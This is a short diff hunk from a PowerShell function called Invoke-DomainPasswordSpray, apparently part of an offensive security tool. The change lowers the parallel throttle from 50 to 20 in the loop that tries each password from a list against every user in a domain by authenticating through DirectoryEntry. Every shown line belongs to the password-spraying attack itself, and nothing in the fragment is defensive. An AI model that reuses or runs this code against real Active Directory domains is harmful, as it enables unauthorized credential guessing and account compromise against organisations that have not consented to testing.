@@ -121,7 +121,7 @@ function Invoke-DomainPasswordSpray {
 		
 		Write-Host "[*] Trying Password $($CurrentPasswordIndex+1) of $($PasswordList.count): $Password"	
 		
-		$UserList | Invoke-Parallel -ImportVariables -Throttle 50 -Quiet -ScriptBlock {
+		$UserList | Invoke-Parallel -ImportVariables -Throttle 20 -Quiet -ScriptBlock {
 			
 			
 			$TestDomain = New-Object System.DirectoryServices.DirectoryEntry($Using:CurrentDomain, $_, $Using:Password)
